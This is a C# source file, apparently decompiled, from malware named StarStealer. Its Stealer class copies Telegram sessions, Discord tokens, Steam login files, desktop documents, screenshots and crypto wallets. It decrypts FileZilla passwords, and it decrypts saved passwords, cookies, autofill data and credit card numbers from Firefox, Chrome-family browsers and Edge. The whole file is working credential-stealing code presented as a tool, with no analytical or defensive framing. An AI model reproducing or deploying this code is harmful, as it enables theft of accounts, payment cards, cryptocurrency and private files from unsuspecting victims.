using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.Win32;
using Newtonsoft.Json;
using StarStealer.APIs;
using StarStealer.Cryptography;
using StarStealer.Entities;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.SQLite;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace StarStealer.Utilities
{
	internal class Stealer
	{
		private static void CopyFilesRecursively(DirectoryInfo source, DirectoryInfo target)
		{
			DirectoryInfo[] directories = source.GetDirectories();
			foreach (DirectoryInfo directoryInfo in directories)
			{
				CopyFilesRecursively(directoryInfo, target.CreateSubdirectory(directoryInfo.Name));
			}
			FileInfo[] files = source.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				fileInfo.CopyTo(Path.Combine(target.FullName, fileInfo.Name));
			}
		}

		public static void MakeScreen(ref User u)
		{
			try
			{
				int num = int.Parse(Screen.PrimaryScreen.Bounds.Width.ToString());
				int num2 = int.Parse(Screen.PrimaryScreen.Bounds.Width.ToString());
				Bitmap bitmap = new Bitmap(int.Parse(u.ScreenResolution.Split('x').First()), int.Parse(u.ScreenResolution.Split('x').Last()));
				Size blockRegionSize = new Size(bitmap.Width, bitmap.Height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(0, 0, 0, 0, blockRegionSize);
				bitmap.Save(Path.Combine(Identifier.StealerFolder, "ScreenShot.png"));
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
			}
		}

		public static void StealFileZilla(ref User user)
		{
			try
			{
				string path = Identifier.ApplicationData + "\\FileZilla\\recentservers.xml";
				if (!File.Exists(path))
				{
					user.FileZilla = false;
				}
				else
				{
					if (File.Exists(Identifier.ApplicationData + "\\FileZilla.txt"))
					{
						File.Delete(Identifier.ApplicationData + "\\FileZilla.txt");
					}
					using (FileStream stream = new FileStream(path, FileMode.Open))
					{
						StreamReader streamReader = new StreamReader(stream);
						Regex regex = new Regex("<Host>(.*)</Host>");
						Regex regex2 = new Regex("<User>(.*)</User>");
						Regex regex3 = new Regex("<Pass encoding=\"base64\">(.*)</Pass>");
						string text = string.Empty;
						string text2 = string.Empty;
						string text3 = string.Empty;
						string input;
						while ((input = streamReader.ReadLine()) != null)
						{
							Match match = regex.Match(input);
							Match match2 = regex2.Match(input);
							Match match3 = regex3.Match(input);
							if (match.Groups[1].ToString() != "")
							{
								text = match.Groups[1].ToString();
							}
							if (match2.Groups[1].ToString() != "")
							{
								text2 = match2.Groups[1].ToString();
							}
							if (match3.Groups[1].ToString() != "")
							{
								text3 = Encoding.UTF8.GetString(Convert.FromBase64String(match3.Groups[1].ToString()));
							}
							if (!string.IsNullOrWhiteSpace(text) && !string.IsNullOrWhiteSpace(text2) && !string.IsNullOrWhiteSpace(text3))
							{
								user.FileZillaData.Add(new FileZilla
								{
									IP = text,
									Login = text2,
									Pass = text3
								});
								user.FileZilla = true;
								text = string.Empty;
								text2 = string.Empty;
								text3 = string.Empty;
							}
						}
						streamReader.Close();
					}
				}
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				user.FileZilla = false;
			}
		}

		public static void StealTelegram(ref User u)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tdesktop.tg\\DefaultIcon");
				string text = (string)registryKey.GetValue(null);
				registryKey.Close();
				text = text.Remove(text.LastIndexOf('\\') + 1);
				string text2 = text.Replace('"', ' ') + "tdata";
				string text3 = Path.Combine(Identifier.StealerFolder, "Telegram");
				string[] files = Directory.GetFiles(text2);
				foreach (string text4 in files)
				{
					string text5 = text4.Split('\\').Last();
					if (text5.Length.Equals(17))
					{
						string path = text5.Substring(0, 16);
						if (Directory.Exists(Path.Combine(text2, path)))
						{
							Directory.CreateDirectory(text3);
							File.Copy(text4, Path.Combine(text3, text5));
							Directory.CreateDirectory(Path.Combine(text3, path));
							string[] files2 = Directory.GetFiles(Path.Combine(text2, path));
							foreach (string text6 in files2)
							{
								if (text6.Split('\\').Last().Contains("map"))
								{
									File.Copy(text6, Path.Combine(text3, path, text6.Split('\\').Last()));
								}
							}
						}
					}
				}
				u.Telegram = true;
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				u.Telegram = false;
			}
		}

		public static void StealDiscord(ref User u)
		{
			try
			{
				if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\\\discord\\Local Storage\\leveldb"))
				{
					string path = Path.Combine(Identifier.StealerFolder, "DiscordData");
					Directory.CreateDirectory(path);
					CopyFilesRecursively(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\\\discord\\Local Storage\\leveldb"), new DirectoryInfo(path));
					u.Discord = true;
				}
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				u.Discord = false;
			}
		}

		public static void StealSteam(ref User u)
		{
			try
			{
				string text = Path.Combine(Identifier.StealerFolder, "SteamData");
				object value = Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);
				if (value == null)
				{
					u.Steam = false;
				}
				else
				{
					string text2 = value.ToString();
					StringBuilder stringBuilder = new StringBuilder();
					string empty = string.Empty;
					string text3 = text2;
					for (int i = 0; i < text3.Length; i++)
					{
						char value2 = text3[i];
						if (value2.Equals('/'))
						{
							stringBuilder.Append("\\");
						}
						else
						{
							stringBuilder.Append(value2);
						}
					}
					empty = stringBuilder.ToString();
					if (!Directory.Exists(empty))
					{
						u.Steam = false;
					}
					else
					{
						Directory.CreateDirectory(text);
						string[] files = Directory.GetFiles(empty, "ssfn*");
						string[] array = files;
						foreach (string text4 in array)
						{
							string fileName = Path.GetFileName(text4);
							File.Copy(text4, Path.Combine(text, fileName), overwrite: true);
						}
						if (File.Exists(empty + "\\config\\config.vdf"))
						{
							File.Copy(empty + "\\config\\config.vdf", text + "\\config.vdf");
						}
						if (File.Exists(empty + "\\config\\loginusers.vdf"))
						{
							File.Copy(empty + "\\config\\loginusers.vdf", text + "\\loginusers.vdf");
						}
						if (File.Exists(empty + "\\config\\SteamAppData.vdf"))
						{
							File.Copy(empty + "\\config\\SteamAppData.vdf", text + "\\SteamAppData.vdf");
						}
						u.Steam = true;
					}
				}
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				u.Steam = false;
			}
		}

		public static void StealDesktop(ref User u)
		{
			try
			{
				string text = Path.Combine(Identifier.ApplicationData, "Desktop");
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string text2 = Path.Combine(Identifier.StealerFolder, "Desktop.zip");
				DirectoryInfo directoryInfo = new DirectoryInfo(folderPath);
				List<string> list = new List<string>
				{
					".doc",
					".docx",
					".txt",
					".png",
					".jpg"
				};
				Directory.CreateDirectory(text);
				Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories);
				FileInfo[] files = directoryInfo.GetFiles("*.*", SearchOption.AllDirectories);
				foreach (FileInfo fileInfo in files)
				{
					foreach (string item2 in list)
					{
						if (fileInfo.FullName.Contains(item2) && !File.Exists(text + "\\" + fileInfo.Name))
						{
							u.DesktopArchiveCount++;
							File.Copy(fileInfo.FullName, text + "\\" + fileInfo.Name);
						}
					}
				}
				if (!File.Exists(text2))
				{
					ZipFile.CreateFromDirectory(text, text2, CompressionLevel.Fastest, includeBaseDirectory: false);
				}
				Directory.Delete(text, recursive: true);
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
			}
		}

		public unsafe static void StealPhoto(ref User u)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Expected O, but got Unknown
			//IL_0054: Unknown result type (might be due to invalid IL or missing references)
			//IL_005e: Expected O, but got Unknown
			bool photoerror = false;
			try
			{
				bool flag = false;
				FilterInfoCollection val = new FilterInfoCollection(FilterCategory.VideoInputDevice);
				if (((CollectionBase)val).Count == 0)
				{
					u.WithPhoto = false;
				}
				else
				{
                    FilterInfoCollection infos = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    VideoCaptureDevice device = new VideoCaptureDevice(infos[0].MonikerString);

					do
					{
						if (File.Exists(Path.Combine(Identifier.StealerFolder, "Photo.png")))
						{
							flag = true;
							u.WithPhoto = true;
						
						}
					}
					while (!flag || photoerror);
				}
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				u.WithPhoto = false;
			}
		}

		public static void DataStealer(ref User u)
		{
			//IL_0213: Unknown result type (might be due to invalid IL or missing references)
			//IL_021a: Expected O, but got Unknown
			//IL_0226: Unknown result type (might be due to invalid IL or missing references)
			//IL_022d: Expected O, but got Unknown
			//IL_05db: Unknown result type (might be due to invalid IL or missing references)
			//IL_05e2: Expected O, but got Unknown
			//IL_05ed: Unknown result type (might be due to invalid IL or missing references)
			//IL_05f4: Expected O, but got Unknown
			//IL_07b4: Unknown result type (might be due to invalid IL or missing references)
			//IL_07bb: Expected O, but got Unknown
			//IL_07c7: Unknown result type (might be due to invalid IL or missing references)
			//IL_07ce: Expected O, but got Unknown
			//IL_0c02: Unknown result type (might be due to invalid IL or missing references)
			//IL_0c09: Expected O, but got Unknown
			//IL_0c15: Unknown result type (might be due to invalid IL or missing references)
			//IL_0c1c: Expected O, but got Unknown
			//IL_0d6d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0d74: Expected O, but got Unknown
			//IL_0d80: Unknown result type (might be due to invalid IL or missing references)
			//IL_0d87: Expected O, but got Unknown
			//IL_0f69: Unknown result type (might be due to invalid IL or missing references)
			//IL_0f70: Expected O, but got Unknown
			//IL_0f7c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0f83: Expected O, but got Unknown
			//IL_10bf: Unknown result type (might be due to invalid IL or missing references)
			//IL_10c6: Expected O, but got Unknown
			//IL_10d2: Unknown result type (might be due to invalid IL or missing references)
			//IL_10d9: Expected O, but got Unknown
			List<Password> list = new List<Password>();
			List<Cookie> list2 = new List<Cookie>();
			List<AutoFill> list3 = new List<AutoFill>();
			List<CC> list4 = new List<CC>();
			foreach (Browser browser in u.Browsers)
			{
				try
				{
					if (browser.Name.Contains("Mozilla"))
					{
						bool flag = false;
						string empty = string.Empty;
						byte[] array = new byte[24];
						bool flag2 = false;
						bool flag3 = false;
						string empty2 = string.Empty;
						string empty3 = string.Empty;
						string text = string.Empty;
						DBHelper dBHelper = new DBHelper();
						Converts converts = new Converts();
						Asn1Der asn1Der = new Asn1Der();
						List<string> list5 = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();
						foreach (string item26 in list5)
						{
							string text2 = item26.Split('\\').Last();
							browser.Profiles.Add(new Profile
							{
								Name = text2
							});
							string[] files = Directory.GetFiles(item26, "signons.sqlite");
							if (files.Length != 0)
							{
								text = item26;
								empty2 = files[0];
								flag3 = true;
							}
							files = Directory.GetFiles(item26, "logins.json");
							if (files.Length != 0)
							{
								text = item26;
								empty3 = files[0];
								flag2 = true;
							}
							if ((flag2 || flag3) && !(text == string.Empty))
							{
								if (flag)
								{
								}
								array = (File.Exists(Path.Combine(text, "key3.db")) ? dBHelper.CheckKey3DB(item26, empty, flag) : dBHelper.CheckKey4DB(item26, empty, flag));
								if (array != null && array.Length != 0)
								{
									if (flag3)
									{
										DataTable dataTable = new DataTable();
										if (flag)
										{
										}
										SQLiteConnection val = new SQLiteConnection("Data Source=" + Path.Combine(text, "signons.sqlite"));
										try
										{
											((DbConnection)val).Open();
											SQLiteCommand val2 = new SQLiteCommand(val);
											((DbCommand)val2).CommandText = "select hostname, encryptedUsername, encryptedPassword, guid, encType from moz_logins;";
											SQLiteDataReader reader = val2.ExecuteReader();
											dataTable.Load((IDataReader)reader);
										}
										catch (Exception item)
										{
											Program.Errors.Add(item);
										}
										finally
										{
											((IDisposable)val)?.Dispose();
										}
										foreach (DataRow row in dataTable.Rows)
										{
											try
											{
												Asn1DerObject asn1DerObject = asn1Der.Parse(Convert.FromBase64String(row["encryptedUsername"].ToString()));
												Asn1DerObject asn1DerObject2 = asn1Der.Parse(Convert.FromBase64String(row["encryptedPassword"].ToString()));
												string uRL = row["hostname"].ToString();
												string input = TripleDESHelper.DESCBCDecryptor(array, asn1DerObject.objects[0].objects[1].objects[1].Data, asn1DerObject.objects[0].objects[2].Data);
												string input2 = TripleDESHelper.DESCBCDecryptor(array, asn1DerObject2.objects[0].objects[1].objects[1].Data, asn1DerObject2.objects[0].objects[2].Data);
												string login = Regex.Replace(input, "[^\\u0020-\\u007F]", "");
												string pass = Regex.Replace(input2, "[^\\u0020-\\u007F]", "");
												list.Add(new Password
												{
													URL = uRL,
													Login = login,
													Pass = pass
												});
											}
											catch (Exception item2)
											{
												Program.Errors.Add(item2);
											}
										}
									}
									if (flag2)
									{
										if (flag)
										{
										}
										FFLogins fFLogins;
										using (StreamReader streamReader = new StreamReader(Path.Combine(text, "logins.json")))
										{
											string value = streamReader.ReadToEnd();
											fFLogins = JsonConvert.DeserializeObject<FFLogins>(value);
										}
										LoginData[] logins = fFLogins.logins;
										foreach (LoginData loginData in logins)
										{
											try
											{
												Asn1DerObject asn1DerObject3 = asn1Der.Parse(Convert.FromBase64String(loginData.encryptedUsername));
												Asn1DerObject asn1DerObject4 = asn1Der.Parse(Convert.FromBase64String(loginData.encryptedPassword));
												string hostname = loginData.hostname;
												string input3 = TripleDESHelper.DESCBCDecryptor(array, asn1DerObject3.objects[0].objects[1].objects[1].Data, asn1DerObject3.objects[0].objects[2].Data);
												string input4 = TripleDESHelper.DESCBCDecryptor(array, asn1DerObject4.objects[0].objects[1].objects[1].Data, asn1DerObject4.objects[0].objects[2].Data);
												string login2 = Regex.Replace(input3, "[^\\u0020-\\u007F]", "");
												string pass2 = Regex.Replace(input4, "[^\\u0020-\\u007F]", "");
												list.Add(new Password
												{
													URL = hostname,
													Login = login2,
													Pass = pass2
												});
											}
											catch (Exception item3)
											{
												Program.Errors.Add(item3);
											}
										}
									}
									try
									{
										DataTable dataTable2 = new DataTable();
										SQLiteConnection val3 = new SQLiteConnection("Data Source=" + Path.Combine(text, "cookies.sqlite"));
										try
										{
											((DbConnection)val3).Open();
											SQLiteCommand val4 = new SQLiteCommand(val3);
											((DbCommand)val4).CommandText = "select name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly from moz_cookies;";
											SQLiteDataReader reader2 = val4.ExecuteReader();
											dataTable2.Load((IDataReader)reader2);
										}
										finally
										{
											((IDisposable)val3)?.Dispose();
										}
										foreach (DataRow row2 in dataTable2.Rows)
										{
											try
											{
												string text3 = row2["value"].ToString();
												if (text3 == null)
												{
													text3 = "";
												}
												list2.Add(new Cookie
												{
													Name = row2["name"].ToString(),
													Value = text3,
													Host = row2["host"].ToString(),
													Path = row2["path"].ToString(),
													Expiry = row2["expiry"].ToString(),
													LastAccessed = row2["lastAccessed"].ToString(),
													CreationTime = row2["creationTime"].ToString(),
													IsSecure = row2["isSecure"].ToString(),
													HttpOnly = row2["isHttpOnly"].ToString()
												});
											}
											catch (Exception item4)
											{
												Program.Errors.Add(item4);
											}
										}
									}
									catch (Exception item5)
									{
										Program.Errors.Add(item5);
									}
									try
									{
										DataTable dataTable3 = new DataTable();
										SQLiteConnection val5 = new SQLiteConnection("Data Source=" + Path.Combine(text, "formhistory.sqlite"));
										try
										{
											((DbConnection)val5).Open();
											SQLiteCommand val6 = new SQLiteCommand(val5);
											((DbCommand)val6).CommandText = "select * from moz_formhistory;";
											SQLiteDataReader reader3 = val6.ExecuteReader();
											dataTable3.Load((IDataReader)reader3);
										}
										catch (Exception item6)
										{
											Program.Errors.Add(item6);
										}
										finally
										{
											((IDisposable)val5)?.Dispose();
										}
										foreach (DataRow row3 in dataTable3.Rows)
										{
											try
											{
												string text4 = row3["value"].ToString();
												if (text4 == null)
												{
													text4 = "";
												}
												list3.Add(new AutoFill
												{
													Name = row3["fieldname"].ToString(),
													Value = text4,
													TimesUsed = row3["timesUsed"].ToString()
												});
											}
											catch (Exception item7)
											{
												Program.Errors.Add(item7);
											}
										}
									}
									catch (Exception item8)
									{
										Program.Errors.Add(item8);
									}
									foreach (Profile profile in browser.Profiles)
									{
										if (profile.Name.Equals(text2))
										{
											foreach (Password item27 in list)
											{
												try
												{
													profile.Passwords.Add(item27);
													u.PasswordsNumber++;
												}
												catch (Exception item9)
												{
													Program.Errors.Add(item9);
												}
											}
											foreach (Cookie item28 in list2)
											{
												try
												{
													profile.Cookies.Add(item28);
													u.CookiesNumber++;
												}
												catch (Exception item10)
												{
													Program.Errors.Add(item10);
												}
											}
											foreach (AutoFill item29 in list3)
											{
												try
												{
													profile.Autofills.Add(item29);
													u.Forms++;
												}
												catch (Exception item11)
												{
													Program.Errors.Add(item11);
												}
											}
										}
									}
									list.Clear();
									list2.Clear();
									list3.Clear();
									break;
								}
							}
						}
					}
					else
					{
						List<string> list6 = Directory.GetDirectories(browser.Folder).ToList();
						foreach (string item30 in list6)
						{
							string text5 = item30;
							bool flag4 = false;
							string empty4 = string.Empty;
							if (!browser.Name.Equals("Google Chrome"))
							{
								flag4 = true;
								empty4 = "Default";
								text5 = browser.Folder;
							}
							else
							{
								empty4 = text5.Split('\\').Last();
								if (empty4.Contains("Profile ") || empty4.Equals("Default"))
								{
									flag4 = true;
								}
							}
							if (flag4)
							{
								try
								{
									string text6 = Path.Combine(text5, "Login Data");
									string text7 = Path.Combine(text5, "Web Data");
									string text8 = Path.Combine(text5, "Cookies");
									browser.Profiles.Add(new Profile
									{
										Name = empty4
									});
									text6 = Path.Combine(text5, "Login Data");
									text7 = Path.Combine(text5, "Web Data");
									text8 = Path.Combine(text5, "Cookies");
									try
									{
										DataTable dataTable4 = new DataTable();
										SQLiteConnection val7 = new SQLiteConnection("Data Source=" + text6);
										try
										{
											((DbConnection)val7).Open();
											SQLiteCommand val8 = new SQLiteCommand(val7);
											((DbCommand)val8).CommandText = "select * from logins;";
											SQLiteDataReader reader4 = val8.ExecuteReader();
											dataTable4.Load((IDataReader)reader4);
										}
										catch (Exception item12)
										{
											Program.Errors.Add(item12);
										}
										finally
										{
											((IDisposable)val7)?.Dispose();
										}
										foreach (DataRow row4 in dataTable4.Rows)
										{
											try
											{
												byte[] cipherTextBytes = (byte[])row4["password_value"];
												string description;
												string text9 = Encoding.UTF8.GetString(Dp.Decrypt(cipherTextBytes, null, out description));
												if (text9 == null)
												{
													text9 = "";
												}
												list.Add(new Password
												{
													URL = row4["origin_url"].ToString(),
													Login = row4["username_value"].ToString(),
													Pass = text9
												});
											}
											catch (Exception item13)
											{
												Program.Errors.Add(item13);
											}
										}
									}
									catch (Exception item14)
									{
										Program.Errors.Add(item14);
									}
									try
									{
										DataTable dataTable5 = new DataTable();
										SQLiteConnection val9 = new SQLiteConnection("Data Source=" + text8);
										try
										{
											((DbConnection)val9).Open();
											SQLiteCommand val10 = new SQLiteCommand(val9);
											((DbCommand)val10).CommandText = "select * from cookies;";
											SQLiteDataReader reader5 = val10.ExecuteReader();
											dataTable5.Load((IDataReader)reader5);
										}
										catch (Exception item15)
										{
											Program.Errors.Add(item15);
										}
										finally
										{
											((IDisposable)val9)?.Dispose();
										}
										foreach (DataRow row5 in dataTable5.Rows)
										{
											try
											{
												byte[] cipherTextBytes2 = (byte[])row5["encrypted_value"];
												string description2;
												string text10 = Encoding.UTF8.GetString(Dp.Decrypt(cipherTextBytes2, null, out description2));
												if (text10 == null)
												{
													text10 = "";
												}
												list2.Add(new Cookie
												{
													Name = row5["name"].ToString(),
													Value = text10,
													Host = row5["host_key"].ToString(),
													Path = row5["path"].ToString(),
													Expiry = row5["expires_utc"].ToString(),
													LastAccessed = row5["last_access_utc"].ToString(),
													CreationTime = row5["creation_utc"].ToString(),
													IsSecure = row5["is_secure"].ToString(),
													HttpOnly = row5["is_httponly"].ToString()
												});
											}
											catch (Exception item16)
											{
												Program.Errors.Add(item16);
											}
										}
									}
									catch (Exception item17)
									{
										Program.Errors.Add(item17);
									}
									try
									{
										DataTable dataTable6 = new DataTable();
										SQLiteConnection val11 = new SQLiteConnection("Data Source=" + text7);
										try
										{
											((DbConnection)val11).Open();
											SQLiteCommand val12 = new SQLiteCommand(val11);
											((DbCommand)val12).CommandText = "select * from autofill;";
											SQLiteDataReader reader6 = val12.ExecuteReader();
											dataTable6.Load((IDataReader)reader6);
										}
										catch (Exception item18)
										{
											Program.Errors.Add(item18);
										}
										finally
										{
											((IDisposable)val11)?.Dispose();
										}
										foreach (DataRow row6 in dataTable6.Rows)
										{
											try
											{
												string text11 = row6["value"].ToString();
												if (text11 == null)
												{
													text11 = "";
												}
												list3.Add(new AutoFill
												{
													Name = row6["name"].ToString(),
													Value = text11,
													TimesUsed = row6["count"].ToString()
												});
											}
											catch (Exception item19)
											{
												Program.Errors.Add(item19);
											}
										}
									}
									catch (Exception item20)
									{
										Program.Errors.Add(item20);
									}
									try
									{
										DataTable dataTable7 = new DataTable();
										SQLiteConnection val13 = new SQLiteConnection("Data Source=" + text7);
										try
										{
											((DbConnection)val13).Open();
											SQLiteCommand val14 = new SQLiteCommand(val13);
											((DbCommand)val14).CommandText = "select * from credit_cards;";
											SQLiteDataReader reader7 = val14.ExecuteReader();
											dataTable7.Load((IDataReader)reader7);
										}
										catch (Exception item21)
										{
											Program.Errors.Add(item21);
										}
										finally
										{
											((IDisposable)val13)?.Dispose();
										}
										foreach (DataRow row7 in dataTable7.Rows)
										{
											try
											{
												byte[] cipherTextBytes3 = (byte[])row7["card_number_encrypted"];
												string description3;
												string @string = Encoding.UTF8.GetString(Dp.Decrypt(cipherTextBytes3, null, out description3));
												list4.Add(new CC
												{
													Expire = row7["expiration_month"].ToString() + "/" + row7["expiration_year"].ToString(),
													HoldersName = row7["name_on_card"].ToString(),
													Number = @string
												});
											}
											catch (Exception item22)
											{
												Program.Errors.Add(item22);
											}
										}
									}
									catch (Exception item23)
									{
										Program.Errors.Add(item23);
									}
									foreach (Profile profile2 in browser.Profiles)
									{
										if (profile2.Name.Equals(empty4))
										{
											foreach (Password item31 in list)
											{
												profile2.Passwords.Add(item31);
												u.PasswordsNumber++;
											}
											foreach (Cookie item32 in list2)
											{
												profile2.Cookies.Add(item32);
												u.CookiesNumber++;
											}
											foreach (AutoFill item33 in list3)
											{
												profile2.Autofills.Add(item33);
												u.Forms++;
											}
											foreach (CC item34 in list4)
											{
												profile2.Cards.Add(item34);
												u.CardsNumber++;
											}
										}
									}
									list.Clear();
									list2.Clear();
									list3.Clear();
								}
								catch (Exception item24)
								{
									Program.Errors.Add(item24);
								}
							}
							if (!browser.Name.Equals("Google Chrome"))
							{
								break;
							}
						}
					}
				}
				catch (Exception item25)
				{
					Program.Errors.Add(item25);
				}
			}
		}

		public static void Steal(ref User u)
		{
			try
			{
				if (Directory.Exists(Identifier.StealerFolder))
				{
					Directory.Delete(Identifier.StealerFolder, recursive: true);
				}
				if (File.Exists(Path.Combine(Identifier.ApplicationData, "Desktop.Zip")))
				{
					File.Delete(Path.Combine(Identifier.ApplicationData, "Desktop.Zip"));
				}
				Directory.CreateDirectory(Identifier.StealerFolder);
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
			}
			try
			{
				StealFileZilla(ref u);
				StealDiscord(ref u);
				StealTelegram(ref u);
				StealSteam(ref u);
				StealDesktop(ref u);
				MakeScreen(ref u);
				DataStealer(ref u);
				StealPhoto(ref u);
				List<Password> logins = Edge.GetLogins();
				u.Passwords.AddRange(logins);
				u.PasswordsNumber += logins.Count;
				BitcoinSteal(ref u);
			}
			catch (Exception item2)
			{
				Program.Errors.Add(item2);
			}
		}

		public static void BitcoinSteal(ref User u)
		{
			try
			{
				string text = Path.Combine(Identifier.StealerFolder, "Crypto");
				if (File.Exists(Path.Combine(Identifier.ApplicationData, "Bitcoin", "wallet.dat")) || Directory.Exists(Path.Combine(Identifier.ApplicationData, "Electrum", "wallets")))
				{
					u.Bitcoin = true;
					Directory.CreateDirectory(text);
					try
					{
						if (File.Exists(Path.Combine(Identifier.ApplicationData, "Bitcoin", "wallet.dat")))
						{
							Directory.CreateDirectory(Path.Combine(text, "Bitcoin"));
							File.Copy(Path.Combine(Identifier.ApplicationData, "Bitcoin", "wallet.dat"), Path.Combine(text, "Bitcoin", "wallet.dat"));
						}
					}
					catch
					{
					}
					try
					{
						if (Directory.Exists(Path.Combine(Identifier.ApplicationData, "Electrum", "wallets")))
						{
							Directory.CreateDirectory(Path.Combine(text, "Electrum"));
							CopyFilesRecursively(new DirectoryInfo(Path.Combine(Identifier.ApplicationData, "Electrum", "wallets")), new DirectoryInfo(Path.Combine(text, "Electrum")));
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}
}
